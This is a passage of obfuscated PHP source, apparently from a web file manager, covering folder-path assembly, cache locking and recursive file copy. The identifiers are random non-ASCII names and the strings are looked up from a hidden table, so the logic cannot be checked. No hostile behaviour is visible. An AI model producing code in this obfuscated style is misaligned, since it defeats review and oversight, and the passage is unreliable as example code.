Model($‰Œå¡ÕŠ[613])->getInfo($™’öî[$‰Œå¡ÕŠ[597]]); $ã‡¼ğò = $this->parentLevelArray($ò…Â·—¡[$‰Œå¡ÕŠ[612]]); $‹åû¾«’ = $‰Œå¡ÕŠ[12]; foreach ($ã‡¼ğò as $³†Ñ«) { $Ÿ¹úöß€ = Model($‰Œå¡ÕŠ[613])->getInfo($³†Ñ«); $‹åû¾«’ .= $Ÿ¹úöß€[$‰Œå¡ÕŠ[90]][$‰Œå¡ÕŠ[191]] . $‰Œå¡ÕŠ[50]; } $™’öî[$‰Œå¡ÕŠ[614]] = $ò…Â·—¡[$‰Œå¡ÕŠ[190]]; $™’öî[$‰Œå¡ÕŠ[615]] = $ò…Â·—¡[$‰Œå¡ÕŠ[612]]; $™’öî[$‰Œå¡ÕŠ[616]] = $ò…Â·—¡[$‰Œå¡ÕŠ[617]]; $™’öî[$‰Œå¡ÕŠ[618]] = $‹åû¾«’ . $ò…Â·—¡[$‰Œå¡ÕŠ[90]][$‰Œå¡ÕŠ[191]]; } protected function _listAppendPath(&$®šÕ§ª, $ËáÌËù£ = false) { $Å¾Ãû×æ =& $_SERVER[”øäÃÍª]; static $ıãüîÈŠ = array(); $ğË®¯Ó = array(); $åûªÛÙ = array(); if ($ËáÌËù£) { return $ıãüîÈŠ; } foreach ($®šÕ§ª as &$³ôÉÊ—¾) { $§éŠ ´ = $³ôÉÊ—¾[$Å¾Ãû×æ[191]]; if ($³ôÉÊ—¾[$Å¾Ãû×æ[508]] == $Å¾Ãû×æ[91] && $³ôÉÊ—¾[$Å¾Ãû×æ[190]] != 0) { $ıãüîÈŠ[$§éŠ ´] = $³ôÉÊ—¾[$Å¾Ãû×æ[32]]; } if ($³ôÉÊ—¾[$Å¾Ãû×æ[508]] == $Å¾Ãû×æ[91] && $³ôÉÊ—¾[$Å¾Ãû×æ[190]] == 0) { $ıãüîÈŠ[$§éŠ ´] = $this->_listAppendPathRoot($³ôÉÊ—¾, array()); } if (isset($åûªÛÙ[$³ôÉÊ—¾[$Å¾Ãû×æ[612]]])) { continue; } $åûªÛÙ[$³ôÉÊ—¾[$Å¾Ãû×æ[612]]] = !0; $³ÌåÖº« = $this->parentLevelArray($³ôÉÊ—¾[$Å¾Ãû×æ[612]]); foreach ($³ÌåÖº« as $Ğö“·Ä¢ => $ñ“²‰î—) { if (isset($ıãüîÈŠ[$ñ“²‰î—])) { continue; } if ($Ğö“·Ä¢ == 0) { $ıãüîÈŠ[$ñ“²‰î—] = $this->_listAppendPathRoot($³ôÉÊ—¾, $³ÌåÖº«); } if ($Ğö“·Ä¢ != 0) { $ğË®¯Ó[] = $ñ“²‰î—; } } } unset($³ôÉÊ—¾); $ğË®¯Ó = array_unique($ğË®¯Ó); if (count($ğË®¯Ó) > 0) { $úÅˆò = array($Å¾Ãû×æ[514] => array($Å¾Ãû×æ[515], $ğË®¯Ó)); if (count($ğË®¯Ó) == 1) { $çÇ›ÉØ = $this->sourceInfo($ğË®¯Ó[0]); $·ñ“«±î = is_array($çÇ›ÉØ) ? array($çÇ›ÉØ) : !1; } else { $·ñ“«±î = $this->field($Å¾Ãû×æ[619])->where($úÅˆò)->select(); } if (!$·ñ“«±î) { $·ñ“«±î = array(); } foreach ($·ñ“«±î as $š¨ŸÌù‘) { $ıãüîÈŠ[$š¨ŸÌù‘[$Å¾Ãû×æ[191]]] = $š¨ŸÌù‘[$Å¾Ãû×æ[32]]; } } $æ¡ï›ıß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $³ĞÎë½ = array(); foreach ($®šÕ§ª as &$³ôÉÊ—¾) { $ÍÍÑ¹ƒ = $³ôÉÊ—¾[$Å¾Ãû×æ[612]]; $ıÂ¤ ¼¢ = $Å¾Ãû×æ[12]; if (isset($³ĞÎë½[$ÍÍÑ¹ƒ])) { $ıÂ¤ ¼¢ = $³ĞÎë½[$ÍÍÑ¹ƒ]; } else { $³ÌåÖº« = $this->parentLevelArray($³ôÉÊ—¾[$Å¾Ãû×æ[612]]); foreach ($³ÌåÖº« as $Ğö“·Ä¢ => $ñ“²‰î—) { if (isset($ıãüîÈŠ[$ñ“²‰î—])) { $ıÂ¤ ¼¢ .= $ıãüîÈŠ[$ñ“²‰î—] . $Å¾Ãû×æ[8]; } } $³ĞÎë½[$ÍÍÑ¹ƒ] = $ıÂ¤ ¼¢; } $ıÂ¤ ¼¢ .= $³ôÉÊ—¾[$Å¾Ãû×æ[32]]; if ($³ôÉÊ—¾[$Å¾Ãû×æ[508]] == $Å¾Ãû×æ[91]) { $ıÂ¤ ¼¢ .= $Å¾Ãû×æ[8]; } $³ôÉÊ—¾[$Å¾Ãû×æ[610]] = str_replace($Å¾Ãû×æ[254], $Å¾Ãû×æ[8], $ıÂ¤ ¼¢); if ($³ôÉÊ—¾[$Å¾Ãû×æ[190]] == $Å¾Ãû×æ[228]) { $³ôÉÊ—¾[$Å¾Ãû×æ[32]] = trim($ıãüîÈŠ[$³ôÉÊ—¾[$Å¾Ãû×æ[191]]], $Å¾Ãû×æ[8]); $³ôÉÊ—¾[$Å¾Ãû×æ[610]] = $³ôÉÊ—¾[$Å¾Ãû×æ[32]] . $Å¾Ãû×æ[8]; } if (intval($³ôÉÊ—¾[$Å¾Ãû×æ[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($³ôÉÊ—¾, $³ÌåÖº«, $æ¡ï›ıß); } } unset($³ôÉÊ—¾); return $®šÕ§ª; } private function _listAppendPathRecycle(&$ğ§§û, $²—‘‚Áä, $¾ñ‘òÌ) { $»Âè©± =& $_SERVER[”øäÃÍª]; if (!in_array($¾ñ‘òÌ, $²—‘‚Áä) && $ğ§§û[$»Âè©±[191]] != $¾ñ‘òÌ) { return; } $»“³‚‡ç = explode($»Âè©±[8], trim($ğ§§û[$»Âè©±[610]], $»Âè©±[8])); $÷¹‘„ˆµ = implode($»Âè©±[8], array_slice($»“³‚‡ç, 2)); $ğ§§û[$»Âè©±[610]] = $»Âè©±[8] . LNG($»Âè©±[620]) . $»Âè©±[8] . ltrim($÷¹‘„ˆµ, $»Âè©±[8]); $ğ§§û[$»Âè©±[612]] = $»Âè©±[621] . implode($»Âè©±[50], array_slice($²—‘‚Áä, 1)) . $»Âè©±[50]; if ($ğ§§û[$»Âè©±[191]] == $¾ñ‘òÌ) { $ğ§§û[$»Âè©±[612]] = $»Âè©±[621]; $ğ§§û[$»Âè©±[190]] = $»Âè©±[228]; $ğ§§û[$»Âè©±[32]] = LNG($»Âè©±[620]); } $ğ§§û[$»Âè©±[622]] = $»Âè©±[623]; } protected function _listAppendPathRoot(&$Êú†Ù˜Â, $¹ç¦¾ôø) { $È¬‹œƒû =& $_SERVER[”øäÃÍª]; static $Ø°Ñ–ıÁ = false; static $ı¬Ö€ã® = false; $×»Øíù = $È¬‹œƒû[12]; if ($Êú†Ù˜Â[$È¬‹œƒû[188]] == self::TYPE_USER) { if ($Êú†Ù˜Â[$È¬‹œƒû[597]] == USER_ID) { $×»Øíù = LNG($È¬‹œƒû[624]); if ($Ø°Ñ–ıÁ === !1) { $üš€Çã´ = Model($È¬‹œƒû[625])->getInfoFull(USER_ID); $Ø°Ñ–ıÁ = _get($üš€Çã´, $È¬‹œƒû[626], $È¬‹œƒû[12]); } if ($ı¬Ö€ã® === !1) { $üš€Çã´ = Model($È¬‹œƒû[625])->getInfoFull(USER_ID); $ı¬Ö€ã® = _get($üš€Çã´, $È¬‹œƒû[627], $È¬‹œƒû[12]); } if ($¹ç¦¾ôø && $¹ç¦¾ôø[0] == $Ø°Ñ–ıÁ || !$¹ç¦¾ôø && $Êú†Ù˜Â[$È¬‹œƒû[191]] == $Ø°Ñ–ıÁ) { $×»Øíù = LNG($È¬‹œƒû[628]); $Êú†Ù˜Â[$È¬‹œƒû[629]] = $È¬‹œƒû[630]; } if ($¹ç¦¾ôø && $¹ç¦¾ôø[0] == $ı¬Ö€ã® || !$¹ç¦¾ôø && $Êú†Ù˜Â[$È¬‹œƒû[191]] == $ı¬Ö€ã®) { $×»Øíù = $×»Øíù . $È¬‹œƒû[631] . LNG($È¬‹œƒû[632]); } if (!$¹ç¦¾ôø) { $Êú†Ù˜Â[$È¬‹œƒû[32]] = $×»Øíù; } } else { $üš€Çã´ = Model($È¬‹œƒû[625])->getInfoFull($Êú†Ù˜Â[$È¬‹œƒû[597]]); $˜¿¢•§ = _get($üš€Çã´, $È¬‹œƒû[627], $È¬‹œƒû[12]); $Êú†Ù˜Â[$È¬‹œƒû[633]] = Model($È¬‹œƒû[605])->getInfoSimpleOuter($Êú†Ù˜Â[$È¬‹œƒû[597]]); $×»Øíù = LNG($È¬‹œƒû[634]) . $È¬‹œƒû[173] . $Êú†Ù˜Â[$È¬‹œƒû[633]][$È¬‹œƒû[32]] . $È¬‹œƒû[175]; if ($¹ç¦¾ôø && $¹ç¦¾ôø[0] == $˜¿¢•§ || !$¹ç¦¾ôø && $Êú†Ù˜Â[$È¬‹œƒû[191]] == $˜¿¢•§) { $×»Øíù = LNG($È¬‹œƒû[634]) . $È¬‹œƒû[635] . $Êú†Ù˜Â[$È¬‹œƒû[633]][$È¬‹œƒû[32]] . $È¬‹œƒû[631] . LNG($È¬‹œƒû[632]) . $È¬‹œƒû[175]; } } } else { if ($Êú†Ù˜Â[$È¬‹œƒû[188]] == self::TYPE_GROUP) { $šÃõ¸¸ã = Model($È¬‹œƒû[613])->getInfoSimple($Êú†Ù˜Â[$È¬‹œƒû[597]]); $×»Øíù = $šÃõ¸¸ã[$È¬‹œƒû[32]]; } else { if ($Êú†Ù˜Â[$È¬‹œƒû[188]] == self::TYPE_SYSTEM) { $×»Øíù = $È¬‹œƒû[636]; } } } $×»Øíù = $×»Øíù ? $È¬‹œƒû[8] . $×»Øíù . $È¬‹œƒû[8] : $È¬‹œƒû[8]; return $×»Øíù; } protected function _listAppendUser(&$‚ëæéâ¤) { $÷¬ßúÔÓ =& $_SERVER[”øäÃÍª]; $½°›—ò = array_to_keyvalue($‚ëæéâ¤, $÷¬ßúÔÓ[12], $÷¬ßúÔÓ[549]); $üÀúœ½¡ = array_to_keyvalue($‚ëæéâ¤, $÷¬ßúÔÓ[12], $÷¬ßúÔÓ[551]); $çŞòÙ© = array_merge($½°›—ò, $üÀúœ½¡); $„š½ûï‰ = Model($÷¬ßúÔÓ[625])->userListInfo($çŞòÙ©); foreach ($‚ëæéâ¤ as &$õ¨Îà) { $÷¼î÷İÚ = $õ¨Îà[$÷¬ßúÔÓ[549]]; $õ¨Îà[$÷¬ßúÔÓ[549]] = $„š½ûï‰[$÷¼î÷İÚ] ? $„š½ûï‰[$÷¼î÷İÚ] : !1; $÷¼î÷İÚ = $õ¨Îà[$÷¬ßúÔÓ[551]]; $õ¨Îà[$÷¬ßúÔÓ[551]] = $„š½ûï‰[$÷¼î÷İÚ] ? $„š½ûï‰[$÷¼î÷İÚ] : !1; if (_get($õ¨Îà, $÷¬ßúÔÓ[637], 0)) { $‰¬û°·ş = $GLOBALS[$÷¬ßúÔÓ[6]][$÷¬ßúÔÓ[92]][$÷¬ßúÔÓ[638]]; if ($õ¨Îà[$÷¬ßúÔÓ[563]][$÷¬ßúÔÓ[639]] <= time() - $‰¬û°·ş) { $this->metaSet($õ¨Îà[$÷¬ßúÔÓ[191]], $÷¬ßúÔÓ[640], null); $this->metaSet($õ¨Îà[$÷¬ßúÔÓ[191]], $÷¬ßúÔÓ[639], null); unset($õ¨Îà[$÷¬ßúÔÓ[563]][$÷¬ßúÔÓ[640]]); continue; } $ş­ÜÌ«© = $õ¨Îà[$÷¬ßúÔÓ[563]][$÷¬ßúÔÓ[640]]; $õ¨Îà[$÷¬ßúÔÓ[563]][$÷¬ßúÔÓ[641]] = Model($÷¬ßúÔÓ[625])->getInfoSimpleOuter($ş­ÜÌ«©); } } unset($õ¨Îà); } public function parentLevelArray($ƒ¨ìîƒâ) { $âã—š¾æ =& $_SERVER[”øäÃÍª]; $ƒ¨ìîƒâ = explode($âã—š¾æ[50], trim($ƒ¨ìîƒâ, $âã—š¾æ[50])); return array_to_int(array_filter($ƒ¨ìîƒâ)); } public function listAll($Ñ”«Ÿë™) { $Ë°°³Üø =& $_SERVER[”øäÃÍª]; $Ùş‹Í¢® = $this->sourceInfo($Ñ”«Ÿë™); $®¬ëÜº = array($Ë°°³Üø[642] => array($Ë°°³Üø[643], $Ùş‹Í¢®[$Ë°°³Üø[612]] . $Ñ”«Ÿë™ . $Ë°°³Üø[644]), $Ë°°³Üø[645] => 0); $”éÚÊµ· = $Ë°°³Üø[646]; $»üÍ‡ ´ = "\x4c\x45\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\151\157\137\x66\x69\x6c\x65\x20\146\x69\154\x65\40\x6f\x6e\x20\x73\157\x75\162\143\145\x2e\146\151\154\145\x49\104\40\75\x20\x66\151\154\x65\x2e\146\x69\154\x65\111\x44"; $´Ú¼œ»ï = $this->alias($Ë°°³Üø[541])->field($”éÚÊµ·)->where($®¬ëÜº)->join($»üÍ‡ ´)->select(); $this->_listAppendAuth($´Ú¼œ»ï); $this->_listAppendUser($´Ú¼œ»ï); $this->_listAppendPath($´Ú¼œ»ï); $´Ú¼œ»ï = array_to_keyvalue($´Ú¼œ»ï, $Ë°°³Üø[191]); $Ôİˆ‚½Ü = "\57{$Ùş‹Í¢®[$Ë°°³Üø[32]]}\57"; $Ôİˆ‚½Ü = $Ôİˆ‚½Ü == $Ë°°³Üø[254] ? $Ë°°³Üø[8] : $Ôİˆ‚½Ü; $ºÙŒ“ûˆ = array(); foreach ($´Ú¼œ»ï as $¡·ØÕÍ† => $á£œš„¹) { $÷í¸¡ªÇ = $this->parentLevelArray($á£œš„¹[$Ë°°³Üø[612]]); array_shift($÷í¸¡ªÇ); $§¿ÉÄ‰¥ = $Ôİˆ‚½Ü; for ($Š®ç‚‚ˆ = 0; $Š®ç‚‚ˆ < count($÷í¸¡ªÇ); $Š®ç‚‚ˆ++) { $§¿ÉÄ‰¥ .= $´Ú¼œ»ï[$÷í¸¡ªÇ[$Š®ç‚‚ˆ]][$Ë°°³Üø[32]] . $Ë°°³Üø[8]; } $§¿ÉÄ‰¥ .= $á£œš„¹[$Ë°°³Üø[32]]; if ($á£œš„¹[$Ë°°³Üø[508]]) { $§¿ÉÄ‰¥ .= $Ë°°³Üø[8]; } $„¥…äÁ¬ = array($Ë°°³Üø[518] => str_replace($Ë°°³Üø[254], $Ë°°³Üø[8], str_replace($Ë°°³Üø[254], $Ë°°³Üø[8], str_replace($Ë°°³Üø[254], $Ë°°³Üø[8], $§¿ÉÄ‰¥))), $Ë°°³Üø[647] => intval($á£œš„¹[$Ë°°³Üø[508]]), $Ë°°³Üø[648] => intval($á£œš„¹[$Ë°°³Üø[79]]), $Ë°°³Üø[88] => intval($á£œš„¹[$Ë°°³Üø[88]]), $Ë°°³Üø[90] => $this->pathInfoFilter($á£œš„¹)); if (!$„¥…äÁ¬[$Ë°°³Üø[508]]) { $„¥…äÁ¬[$Ë°°³Üø[565]] = $á£œš„¹[$Ë°°³Üø[565]]; } $ºÙŒ“ûˆ[] = $„¥…äÁ¬; } $ºÙŒ“ûˆ = array_sort_by($ºÙŒ“ûˆ, $Ë°°³Üø[87]); return $ºÙŒ“ûˆ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($†á—ç×) { $ëù—Î¸ô =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $this->_lockCheck($ëù—Î¸ô[649], $†á—ç×); $‘—•±¦ë = 1; $this->_lockEvent($†á—ç×, array($ëù—Î¸ô[650], $ëù—Î¸ô[651]), $‘—•±¦ë); $this->_lockParent($†á—ç×, array($ëù—Î¸ô[651]), $‘—•±¦ë); $this->_lockEvent($†á—ç×, array($ëù—Î¸ô[652], $ëù—Î¸ô[653]), $‘—•±¦ë); $this->_lockCheckEnd($ëù—Î¸ô[649], $†á—ç×); } public function lockCopyEnd($¾İàß¬) { $Ò™ñşŠ¦ =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $Õ»µƒ…û = 0; $this->_lockEvent($¾İàß¬, array($Ò™ñşŠ¦[650], $Ò™ñşŠ¦[651]), $Õ»µƒ…û); $this->_lockParent($¾İàß¬, array($Ò™ñşŠ¦[651]), $Õ»µƒ…û); $this->_lockEvent($¾İàß¬, array($Ò™ñşŠ¦[652], $Ò™ñşŠ¦[653]), $Õ»µƒ…û); } public function lockWriteStart($Â™İºÄœ, $¨âÕ°‘ş = '') { $›‰‹‡©Ò =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $this->_lockCheck($›‰‹‡©Ò[650], $Â™İºÄœ); $Éá‹›ì = 1; $this->_lockKey($›‰‹‡©Ò[654] . $Â™İºÄœ . $›‰‹‡©Ò[10] . $¨âÕ°‘ş, $Éá‹›ì); $this->_lockEvent($Â™İºÄœ, array($›‰‹‡©Ò[649], $›‰‹‡©Ò[651]), $Éá‹›ì); $this->_lockParent($Â™İºÄœ, array($›‰‹‡©Ò[649], $›‰‹‡©Ò[651]), $Éá‹›ì); $this->_lockCheckEnd($›‰‹‡©Ò[650], $Â™İºÄœ); } public function lockWriteEnd($œ÷¤şüÈ, $şƒÔÃù = '') { $ÃÖüŸ˜ =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $Øˆ’¸” = 0; $this->_lockKey($ÃÖüŸ˜[654] . $œ÷¤şüÈ . $ÃÖüŸ˜[10] . $şƒÔÃù, $Øˆ’¸”); $this->_lockEvent($œ÷¤şüÈ, array($ÃÖüŸ˜[649], $ÃÖüŸ˜[651]), $Øˆ’¸”); $this->_lockParent($œ÷¤şüÈ, array($ÃÖüŸ˜[649], $ÃÖüŸ˜[651]), $Øˆ’¸”); } public function lockMoveStart($Ä¼Å¢Ò) { $ıµ÷àöú =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $this->_lockCheck($ıµ÷àöú[651], $Ä¼Å¢Ò); $ïÑüÎ®ã = 1; $this->_lockKey($ıµ÷àöú[655] . $Ä¼Å¢Ò, $ïÑüÎ®ã); $this->_lockEvent($Ä¼Å¢Ò, array($ıµ÷àöú[649], $ıµ÷àöú[650]), $ïÑüÎ®ã); $this->_lockParent($Ä¼Å¢Ò, array($ıµ÷àöú[649], $ıµ÷àöú[651]), $ïÑüÎ®ã); $this->_lockEvent($Ä¼Å¢Ò, array($ıµ÷àöú[656], $ıµ÷àöú[652], $ıµ÷àöú[653]), $ïÑüÎ®ã); $this->_lockCheckEnd($ıµ÷àöú[651], $Ä¼Å¢Ò); } public function lockMoveEnd($ú£«³õâ) { $ú¸üµæ× =& $_SERVER[”øäÃÍª]; if (!$this->allowLock()) { return; } $ËŸ¬İ‡Ö = 0; $this->_lockKey($ú¸üµæ×[655] . $ú£«³õâ, $ËŸ¬İ‡Ö); $this->_lockEvent($ú£«³õâ, array($ú¸üµæ×[649], $ú¸üµæ×[650]), $ËŸ¬İ‡Ö); $this->_lockParent($ú£«³õâ, array($ú¸üµæ×[649], $ú¸üµæ×[651]), $ËŸ¬İ‡Ö); $this->_lockEvent($ú£«³õâ, array($ú¸üµæ×[656], $ú¸üµæ×[652], $ú¸üµæ×[653]), $ËŸ¬İ‡Ö); } private function _lockCheck($¼¹‘òÚË, $‡£€¯³‰) { $Åè™íÆ =& $_SERVER[”øäÃÍª]; $¶µê‚ò  = $this->sourceInfo($‡£€¯³‰); $ïÏ‘ô÷ = $¼¹‘òÚË . $Åè™íÆ[10] . $‡£€¯³‰; $this->_lockTimeStart[$ïÏ‘ô÷] = timeFloat(); if (!is_array($¶µê‚ò )) { return; } $å¥ÓëÌô = LNG($Åè™íÆ[657]); CacheLock::setErrorMsg($Åè™íÆ[173] . htmlspecialchars($¶µê‚ò [$Åè™íÆ[32]]) . $Åè™íÆ[175] . $å¥ÓëÌô); $this->_lockKey($ïÏ‘ô÷, 1); $this->_lockKey($ïÏ‘ô÷, 0); $¬ªì¦Äã = array_reverse($this->parentLevelArray($¶µê‚ò [$Åè™íÆ[612]])); foreach ($¬ªì¦Äã as $ ø”äÆ) { $ïÏ‘ô÷ = $¼¹‘òÚË . $Åè™íÆ[658] . $ ø”äÆ; if (CacheLock::lockGet($Åè™íÆ[659] . $ïÏ‘ô÷)) { $¶µê‚ò  = $this->sourceInfo($ ø”äÆ); CacheLock::setErrorMsg($Åè™íÆ[173] . htmlspecialchars($¶µê‚ò [$Åè™íÆ[32]]) . $Åè™íÆ[175] . $å¥ÓëÌô); $this->_lockKey($ïÏ‘ô÷, 1); $this->_lockKey($ïÏ‘ô÷, 0); } } } private function _lockCheckEnd($®å¥ƒ‘İ, $·¿Â”â°) { $ÜÍ ¿Ş© =& $_SERVER[”øäÃÍª]; $“¬¥ØÁÅ = $®å¥ƒ‘İ . $ÜÍ ¿Ş©[10] . $·¿Â”â°; CacheLock::setErrorMsg($ÜÍ ¿Ş©[463]); if (!isset($this->_lockTimeStart[$“¬¥ØÁÅ])) { return; } $ÈãØõ¸Ğ = timeFloat() - $this->_lockTimeStart[$“¬¥ØÁÅ]; unset($this->_lockTimeStart[$“¬¥ØÁÅ]); if ($ÈãØõ¸Ğ > 0.5) { unset(self::$cacheSourceInfo[$ÜÍ ¿Ş©[555] . $·¿Â”â°]); } $¬È¯§‘÷ = $this->sourceInfo($·¿Â”â°); if (!$¬È¯§‘÷) { show_json(LNG($ÜÍ ¿Ş©[105]), !1); } } private function _lockParent($çî®»Ø», $ØÌ»ÖÀÀ, $°ÏúşÇ) { if (!$this->autoLockSet) { return; } $µüÊêåİ = $this->sourceInfo($çî®»Ø»); if (!is_array($µüÊêåİ)) { return; } $ıã¤ê¹ = array_reverse($this->parentLevelArray($µüÊêåİ[$_SERVER[”øäÃÍª][612]])); foreach ($ıã¤ê¹ as $‚Öï¸òã) { $this->_lockEvent($‚Öï¸òã, $ØÌ»ÖÀÀ, $°ÏúşÇ); } } private function _lockEvent($Óò÷Çİ‡, $ãä‚Ş¿Á, $ÈŸ—Ü²ß) { $©Áì¬åË =& $_SERVER[”øäÃÍª]; if (!$this->autoLockSet) { return; } foreach ($ãä‚Ş¿Á as $ò‚¯²ÆÚ) { $ÔÉ×ª°€ = $ò‚¯²ÆÚ . $©Áì¬åË[10] . $Óò÷Çİ‡; if ($ÈŸ—Ü²ß && CacheLock::lockGet($©Áì¬åË[659] . $ÔÉ×ª°€)) { continue; } $this->_lockKey($ÔÉ×ª°€, $ÈŸ—Ü²ß); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($œË§ğü, $Àµ‹Ô©Â = 1) { $·Ø¨ùÓÄ = $_SERVER[”øäÃÍª][659] . md5($œË§ğü); if ($Àµ‹Ô©Â) { if (isset(self::$_lockItemArr[$·Ø¨ùÓÄ])) { return; } self::$_lockItemArr[$·Ø¨ùÓÄ] = 1; CacheLock::lock($·Ø¨ùÓÄ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$·Ø¨ùÓÄ])) { return; } unset(self::$_lockItemArr[$·Ø¨ùÓÄ]); CacheLock::unlock($·Ø¨ùÓÄ); } } public function isParentOf($á‚Æ¸Ñ, $ÖÕé›Òõ) { $üöîÌº‚ =& $_SERVER[”øäÃÍª]; $È¬ÄĞè¨ = $this->sourceInfo($á‚Æ¸Ñ); $Øª©èâØ = $this->sourceInfo($ÖÕé›Òõ); $ò²Ñ³´ = $È¬ÄĞè¨[$üöîÌº‚[612]] . $È¬ÄĞè¨[$üöîÌº‚[191]] . $üöîÌº‚[50]; $ÊÕ…Àƒì = $Øª©èâØ[$üöîÌº‚[612]] . $Øª©èâØ[$üöîÌº‚[191]] . $üöîÌº‚[50]; $µ¢õ±ñÂ = strpos($ÊÕ…Àƒì, $ò²Ñ³´) === 0; return $µ¢õ±ñÂ; } private $targetIsDelete = 0; public function copy($êêş­™©, $Ê»Ø¼É, $×ªÔ‘òÎ = REPEAT_REPLACE, $è¨´àƒÂ = '') { $´ÒÜÉÏ³ =& $_SERVER[”øäÃÍª]; $Ø…©Ò = $this->sourceInfo($êêş­™©); $¿ÂÛŸñ½ = $this->sourceInfo($Ê»Ø¼É); if (!$Ø…©Ò || !$¿ÂÛŸñ½ || $¿ÂÛŸñ½[$´ÒÜÉÏ³[508]] != $´ÒÜÉÏ³[91]) { return !1; } if ($this->isParentOf($êêş­™©, $Ê»Ø¼É)) { return !1; } $½Ñ¡ÆûØ = $è¨´àƒÂ ? $è¨´àƒÂ : $Ø…©Ò[$´ÒÜÉÏ³[32]]; $this->lockCopyStart($êêş­™©); $this->lockWriteStart($Ê»Ø¼É, $½Ñ¡ÆûØ); $† ¡Ûïò = array($´ÒÜÉÏ³[660] => array(), $´ÒÜÉÏ³[661] => array(), $´ÒÜÉÏ³[662] => array()); $this->targetIsDelete = intval($Ø…©Ò[$´ÒÜÉÏ³[528]]); $é‚´ï = $this->fileNameExistAuto($Ê»Ø¼É, $Ø…©Ò); $˜¡¶Óí¶ = $this->_copy($êêş­™©, $Ê»Ø¼É, $×ªÔ‘òÎ, $† ¡Ûïò, !0, $è¨´àƒÂ); $this->_childrenListClear(); $this->lockCopyEnd($êêş­™©); $this->lockWriteEnd($Ê»Ø¼É, $½Ñ¡ÆûØ); if ($Ø…©Ò[$´ÒÜÉÏ³[508]] == $´ÒÜÉÏ³[91] && $é‚´ï == $˜¡¶Óí¶) { $this->folderSizeResetChildren($é‚´ï); } Model($´ÒÜÉÏ³[471])->addAll($† ¡Ûïò[$´ÒÜÉÏ³[661]], array(), !0); if ($é‚´ï != $˜¡¶Óí¶ || $Ø…©Ò[$´ÒÜÉÏ³[508]] == $´ÒÜÉÏ³[91]) { Model($´ÒÜÉÏ³[663])->eventCopy($˜¡¶Óí¶); } $this->saveAll($† ¡Ûïò[$´ÒÜÉÏ³[662]]); Model($´ÒÜÉÏ³[230])->linkAdd($† ¡Ûïò[$´ÒÜÉÏ³[660]]); $this->folderSizeReset($Ê»Ø¼É); $this->updateModifyTime($Ê»Ø¼É); return $˜¡¶Óí¶; } private function _copy($®÷Ì·¹Õ, $ı€É¼êû, $ƒòŸË‰, &$÷­¼œ¾À, $û²Êµ, $Ö¥†¾Òò = '') { $Îñš›… =& $_SERVER[”øäÃÍª]; $ÀıÅéóƒ = $this->sourceInfoCache($®÷Ì·¹Õ); $¬µÜñÚ§ = $ÀıÅéóƒ[$Îñš›…[508]] == $Îñš›…[91]; $íÖæÅâø = $Ö¥†¾Òò ? $Ö¥†¾Òò : $ÀıÅéóƒ[$Îñš›…[32]]; $ıÎà¢ëº = $this->fileNameExistAuto($ı€É¼êû, $ÀıÅéóƒ); if ($û²Êµ) { $this->_childrenAllMake($®÷Ì·¹Õ); if ($¬µÜñÚ§ && $ıÎà¢ëº) { $this->_childrenAllMake($ıÎà¢ëº); } } if (!$ıÎà¢ëº) { return $this->_copyCreate($®÷Ì·¹Õ, $ı€É¼êû, $íÖæÅâø, $÷­¼œ¾À); } $Èì¼Ó¦³ = $ıÎà¢ëº; if ($¬µÜñÚ§) { if ($ƒòŸË‰ == REPEAT_RENAME_FOLDER) { $íÖæÅâø = $this->fileNameAutoCache($ı€É¼êû, $íÖæÅâø, $ƒòŸË‰, $¬µÜñÚ§); $Èì¼Ó¦³ = $this->_copyCreate($®÷Ì·¹Õ, $ı€É¼êû, $íÖæÅâø, $÷­¼œ¾À); } else { $²³ìßñ¾ = $this->_childrenList($®÷Ì·¹Õ); foreach ($²³ìßñ¾ as $¿××÷–) { $this->_copy($¿××÷–[$Îñš›…[191]], $ıÎà¢ëº, $ƒòŸË‰, $÷­¼œ¾À, !1); } } } else { if ($ƒòŸË‰ == REPEAT_RENAME || $ƒòŸË‰ == REPEAT_RENAME_FOLDER) { $íÖæÅâø = $this->fileNameAutoCache($ı€É¼êû, $íÖæÅâø, $ƒòŸË‰, $¬µÜñÚ§); $Èì¼Ó¦³ = $this->_copyCreate($®÷Ì·¹Õ, $ı€É¼êû, $íÖæÅâø, $÷­¼œ¾À); } else { if ($ƒòŸË‰ == REPEAT_REPLACE) { $ ®Šû‹½ = $this->sourceInfoCache($ıÎà¢ëº); $„§·ŞõÀ = $this->fileHistory($ ®Šû‹½, $ÀıÅéóƒ[$Îñš›…[565]], $ÀıÅéóƒ[$Îñš›…[79]]); if ($„§·ŞõÀ) { $÷­¼œ¾À[$Îñš›…[660]][] = $ÀıÅéóƒ[$Îñš›…[565]]; } } else { if ($ƒòŸË‰ == REPEAT_SKIP) { } } } Hook::trigger($Îñš›…[664], array($Îñš›…[665], $ÀıÅéóƒ, 0)); } return $Èì¼Ó¦³; } private function _copyCreate($§ô½ôÂï, $•…Ø’š, $Õñï‡ñ, &$ÀÜıÇ¶) { $á«Òòò =& $_SERVER[”øäÃÍª]; $‹‚”ÎÀ· = $this->sourceInfoCache($§ô½ôÂï); $°ŸÒÊÆŒ = $this->sourceInfoCache($•…Ø’š); $¤·É¥ûØ = $this->_makeItemData($‹‚”ÎÀ·, $°ŸÒÊÆŒ, $Õñï‡ñ); Hook::trigger($á«Òòò[666], $¤·É¥ûØ); Hook::trigger($á«Òòò[667], array($á«Òòò[668], $¤·É¥ûØ, 0)); $È´·°°ƒ = $this->add($¤·É¥ûØ); $ŠÜ›™Ç­ = array($á«Òòò[191] => $È´·°°ƒ, $á«Òòò[32] => $Õñï‡ñ); $this->_copyApplyMeta($ŠÜ›™Ç­, $ÀÜıÇ¶); if ($‹‚”ÎÀ·[$á«Òòò[508]] != $á«Òòò[91]) { $ÀÜıÇ¶[$á«Òòò[660]][] = $‹‚”ÎÀ·[$á«Òòò[565]]; return $È´·°°ƒ; } 